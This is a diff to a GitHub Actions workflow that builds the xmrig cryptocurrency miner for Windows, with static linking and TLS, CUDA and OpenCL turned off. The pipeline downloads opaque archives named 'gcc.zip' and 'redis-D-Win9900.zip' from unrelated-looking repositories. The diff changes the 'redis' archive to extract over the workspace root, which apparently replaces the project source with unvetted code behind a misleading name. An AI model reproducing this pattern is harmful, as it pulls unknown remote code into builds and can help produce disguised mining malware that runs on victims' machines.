@@ -10,38 +10,38 @@ jobs:
   build-windows:
     runs-on: windows-latest
     env:
-      REPO_PATH: ${{ github.workspace }}  # Using GitHub workspace variable for accurate path
+      REPO_PATH: ${{ github.workspace }}
 
     steps:
       - name: Checkout source code
         uses: actions/checkout@v3
 
-      # Install MSVC build tools directly on the runner
       - name: Setup Visual Studio Developer Command Prompt
         uses: ilammy/msvc-dev-cmd@v1
+        with:
+          arch: x64
 
-      # Create build directories
       - name: Create directories
         run: |
           mkdir -p deps
           mkdir -p artifacts
+          mkdir -p build
 
-      # 打印当前环境信息
       - name: Print environment info
         run: |
           Write-Host "Current working directory: $(Get-Location)"
           Write-Host "GitHub workspace: ${{ github.workspace }}"
+          Write-Host "Files in current directory:"
+          Get-ChildItem -Path . | ForEach-Object { Write-Host "  $($_.Name)" }
           Write-Host "CMake version:"
           cmake --version
           Write-Host "Compiler information:"
           cl.exe 2>&1 | Select-String -Pattern "Version" -SimpleMatch
 
-      # Download dependencies with retry mechanism
       - name: Download dependencies
         run: |
-          $ProgressPreference = 'SilentlyContinue'  # Speeds up downloads
+          $ProgressPreference = 'SilentlyContinue'
           
-          # Function to download with retry
           function Download-WithRetry {
             param(
               [string]$Url,
@@ -72,22 +72,23 @@ jobs:
             }
           }
           
-          # Download required files
           Download-WithRetry -Url "https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip" -OutputFile "deps/gcc.zip"
           Download-WithRetry -Url "https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip" -OutputFile "deps/redis.zip"
         shell: pwsh
 
-      # Extract dependencies
       - name: Extract dependencies
         run: |
-          $ProgressPreference = 'SilentlyContinue'  # Speeds up extraction
+          $ProgressPreference = 'SilentlyContinue'
           Write-Host "Extracting dependencies..."
           
-          # Extract with error handling
           try {
             Expand-Archive -Path deps/gcc.zip -DestinationPath deps/gcc -Force
-            Expand-Archive -Path deps/redis.zip -DestinationPath deps/ -Force
+            Expand-Archive -Path deps/redis.zip -DestinationPath ${{ github.workspace }} -Force
             Write-Host "Extraction completed successfully."
+            
+            # Verify extracted content
+            Write-Host "Content of deps/gcc:"
+            Get-ChildItem -Path deps/gcc -Recurse -Depth 1 | ForEach-Object { Write-Host "  $($_.Name)" }
           }
           catch {
             Write-Host "Error during extraction: $_"
@@ -95,155 +96,135 @@ jobs:
           }
         shell: pwsh
 
-      # Set up CMake
       - name: Set up CMake
         uses: jwlawson/actions-setup-cmake@v1.13
         with:
           cmake-version: '3.20.x'
 
-      # Setup vcpkg to install libuv
       - name: Setup vcpkg
         run: |
-          # Clone vcpkg
           git clone https://github.com/Microsoft/vcpkg.git
           cd vcpkg
           
-          # Bootstrap vcpkg
           ./bootstrap-vcpkg.bat
           
-          # Set environment variables to speed up build
-          $env:VCPKG_DEFAULT_TRIPLET = "x64-windows"
+          $env:VCPKG_DEFAULT_TRIPLET = "x64-windows-static"
           $env:VCPKG_DISABLE_METRICS = "true"
           
-          # Install libuv, openssl, and hwloc
-          ./vcpkg install libuv:x64-windows openssl:x64-windows hwloc:x64-windows
+          ./vcpkg install libuv:x64-windows-static openssl:x64-windows-static hwloc:x64-windows-static
           
-          # Integrate with Visual Studio
           ./vcpkg integrate install
           
-          # List installed packages
           Write-Host "Installed packages:"
           ./vcpkg list
         shell: pwsh
 
-      # Check project structure and CMakeLists.txt
-      - name: Check project structure
+      - name: Print directory structure
         run: |
-          Write-Host "Checking project structure..."
+          Write-Host "Root directory structure:"
+          Get-ChildItem -Path . | ForEach-Object { Write-Host "  $($_.Name)" }
           
-          # 查看项目目录结构
-          Get-ChildItem -Path . -Recurse -Depth 2 | Select-Object FullName
+          if (Test-Path "src") {
+            Write-Host "Content of src directory:"
+            Get-ChildItem -Path src | ForEach-Object { Write-Host "  $($_.Name)" }
+          }
           
-          # 检查CMakeLists.txt
-          $cmakePath = "CMakeLists.txt"
-          if (Test-Path $cmakePath) {
-            Write-Host "CMakeLists.txt found. Content preview:"
-            Get-Content $cmakePath -TotalCount 50
-            
-            # 查找所有与xmrig相关的行
-            Write-Host "Lines related to xmrig target:"
-            Select-String -Path $cmakePath -Pattern "xmrig" | ForEach-Object {
-              Write-Host "Line $($_.LineNumber): $($_.Line)"
-            }
-          } else {
-            Write-Host "CMakeLists.txt not found at expected location: $cmakePath"
+          if (Test-Path "cmake") {
+            Write-Host "Content of cmake directory:"
+            Get-ChildItem -Path cmake | ForEach-Object { Write-Host "  $($_.Name)" }
           }
         shell: pwsh
-        continue-on-error: true
 
-      # 使用CMake构建项目
-      - name: Build with CMake
+      - name: Full CMake build
         run: |
-          # 创建构建目录
-          mkdir -Force build
           cd build
           
-          # 使用正确的路径格式
+          # Set paths
           $xmrigDepsPath = "${{ github.workspace }}/deps/gcc/gcc/x64" -replace '\\', '/'
           $vcpkgPath = "${{ github.workspace }}/vcpkg" -replace '\\', '/'
           Write-Host "Using XMRIG_DEPS path: $xmrigDepsPath"
           Write-Host "Using vcpkg path: $vcpkgPath"
           
-          # 配置CMake
-          cmake .. -G "NMake Makefiles" -DCMAKE_BUILD_TYPE=Release -DXMRIG_DEPS="$xmrigDepsPath" -DBUILD_SHARED_LIBS=OFF -DCMAKE_TOOLCHAIN_FILE="$vcpkgPath/scripts/buildsystems/vcpkg.cmake"
+          # Configure with more detailed output
+          cmake .. -G "Visual Studio 17 2022" -A x64 -DCMAKE_BUILD_TYPE=Release -DXMRIG_DEPS="$xmrigDepsPath" -DBUILD_SHARED_LIBS=OFF -DCMAKE_TOOLCHAIN_FILE="$vcpkgPath/scripts/buildsystems/vcpkg.cmake"
           
-          # 构建
-          nmake
-        shell: pwsh
-        continue-on-error: true
-
-      # 尝试单独构建xmrig.cpp
-      - name: Try direct compile of xmrig.cpp
-        run: |
-          # 定位xmrig.cpp (注意使用正确的路径)
-          $sourcePath = "src/xmrig.cpp"
-          if (Test-Path $sourcePath) {
-            Write-Host "Found xmrig.cpp at $sourcePath"
-            
-            # 检查必要的头文件和路径
-            $xmrigDepsPath = "${{ github.workspace }}/deps/gcc/gcc/x64" -replace '\\', '/'
-            $vcpkgIncludePath = "${{ github.workspace }}/vcpkg/installed/x64-windows/include" -replace '\\', '/'
-            
-            try {
-              # 创建构建目录
-              mkdir -Force artifacts/direct_build -ErrorAction Stop
-              cd artifacts/direct_build
-              
-              # 尝试直接编译 (注意这里使用相对路径参考源码的实际位置)
-              Write-Host "Attempting direct compilation of xmrig.cpp..."
-              cl.exe /EHsc /MD /I"$xmrigDepsPath/include" /I"$vcpkgIncludePath" /I"${{ github.workspace }}/src" "../../$sourcePath" /link /LIBPATH:"$xmrigDepsPath/lib" /LIBPATH:"${{ github.workspace }}/vcpkg/installed/x64-windows/lib" uv.lib libcrypto.lib user32.lib
-              
-              if (Test-Path "xmrig.obj") {
-                Write-Host "Successfully compiled xmrig.obj!"
-                Copy-Item -Path "xmrig.obj" -Destination "../../artifacts/" -Force
-              }
+          if ($LASTEXITCODE -ne 0) {
+            Write-Host "CMake configure failed with exit code $LASTEXITCODE"
+            if (Test-Path "CMakeFiles/CMakeError.log") {
+              Write-Host "CMake error log:"
+              Get-Content "CMakeFiles/CMakeError.log" | ForEach-Object { Write-Host $_ }
             }
-            catch {
-              Write-Host "Direct compilation failed: $_"
-            }
+            exit $LASTEXITCODE
+          }
+          
+          # Build with maximum logging
+          cmake --build . --config Release --verbose
+          
+          if ($LASTEXITCODE -ne 0) {
+            Write-Host "Build failed with exit code $LASTEXITCODE"
+            exit $LASTEXITCODE
+          }
+          
+          # Check for build artifacts
+          Write-Host "Build artifacts:"
+          if (Test-Path "Release") {
+            Get-ChildItem -Path "Release" | ForEach-Object { Write-Host "  $($_.Name)" }
           } else {
-            Write-Host "Could not find xmrig.cpp at $sourcePath"
-            # 尝试查找xmrig.cpp文件的位置
-            $foundFiles = Get-ChildItem -Path ${{ github.workspace }} -Recurse -Filter "xmrig.cpp" | Select-Object -First 5
-            if ($foundFiles) {
-              Write-Host "Found xmrig.cpp at alternative locations:"
-              $foundFiles | ForEach-Object { Write-Host "  $($_.FullName)" }
-            }
+            Get-ChildItem -Path . -Include "*.exe", "*.dll" -Recurse | ForEach-Object { Write-Host "  $($_.FullName)" }
+          }
+        shell: pwsh
+        continue-on-error: false
+
+      - name: Alternative build with NMake
+        if: failure()
+        run: |
+          cd build
+          Remove-Item -Recurse -Force *
+          
+          $xmrigDepsPath = "${{ github.workspace }}/deps/gcc/gcc/x64" -replace '\\', '/'
+          $vcpkgPath = "${{ github.workspace }}/vcpkg" -replace '\\', '/'
+          
+          # Use NMake with static linkage
+          cmake .. -G "NMake Makefiles" -DCMAKE_BUILD_TYPE=Release -DXMRIG_DEPS="$xmrigDepsPath" -DBUILD_SHARED_LIBS=OFF -DCMAKE_TOOLCHAIN_FILE="$vcpkgPath/scripts/buildsystems/vcpkg.cmake" -DWITH_OPENCL=OFF -DWITH_CUDA=OFF -DWITH_TLS=OFF -DMSVC_RUNTIME=static
+          
+          nmake
+          
+          # Check for build artifacts
+          Get-ChildItem -Path . -Include "*.exe", "*.dll" | ForEach-Object { 
+            Write-Host "Found: $($_.FullName)"
           }
         shell: pwsh
         continue-on-error: true
 
-      # 收集所有可能的构建结果
       - name: Collect build artifacts
         run: |
-          Write-Host "Collecting build artifacts from all possible build directories..."
-          
-          # 定义要搜索的目录
-          $searchDirs = @(
-            "build",
-            "artifacts/direct_build"
-          )
-          
-          # 查找所有可能的构建结果
-          foreach ($dir in $searchDirs) {
-            if (Test-Path $dir) {
-              Write-Host "Checking $dir for build artifacts..."
-              
-              # 查找exe和dll文件
-              Get-ChildItem -Path $dir -Include "*.exe", "*.dll", "*.obj" -Recurse -File | ForEach-Object {
-                Write-Host "Found: $($_.FullName)"
-                Copy-Item -Path $_.FullName -Destination "artifacts/" -Force
-              }
-            }
+          # Create artifacts directory if it doesn't exist
+          if (-not (Test-Path "artifacts")) {
+            mkdir -Force artifacts
           }
           
-          # 复制vcpkg安装的DLL文件
-          if (Test-Path "vcpkg/installed/x64-windows/bin") {
-            Write-Host "Copying vcpkg DLL files"
-            Copy-Item -Path "vcpkg/installed/x64-windows/bin/*.dll" -Destination "artifacts/" -Force
+          # Search for executables and DLLs in all possible build directories
+          $exeFiles = Get-ChildItem -Path ${{ github.workspace }} -Include "*.exe" -Recurse -File
+          $dllFiles = Get-ChildItem -Path ${{ github.workspace }} -Include "*.dll" -Recurse -File | Where-Object { $_.DirectoryName -notlike "*vcpkg*" }
+          
+          foreach ($file in $exeFiles) {
+            Write-Host "Found executable: $($file.FullName)"
+            Copy-Item -Path $file.FullName -Destination "artifacts/" -Force
           }
           
-          # 检查是否有构建结果
+          # Copy required DLLs
+          if ($exeFiles.Count -gt 0) {
+            # Copy vcpkg DLLs only if we found executables
+            Copy-Item -Path "vcpkg/installed/x64-windows/bin/*.dll" -Destination "artifacts/" -Force -ErrorAction SilentlyContinue
+          }
+          
+          # Copy our own DLLs
+          foreach ($file in $dllFiles) {
+            Write-Host "Found DLL: $($file.FullName)"
+            Copy-Item -Path $file.FullName -Destination "artifacts/" -Force
+          }
+          
+          # Verify artifacts
           $artifactFiles = Get-ChildItem -Path "artifacts"
           Write-Host "Total artifacts found: $($artifactFiles.Count)"
           if ($artifactFiles.Count -gt 0) {
@@ -255,7 +236,6 @@ jobs:
         shell: pwsh
         continue-on-error: true
 
-      # Upload artifacts
       - name: Archive build artifacts
         uses: actions/upload-artifact@v4
         with:
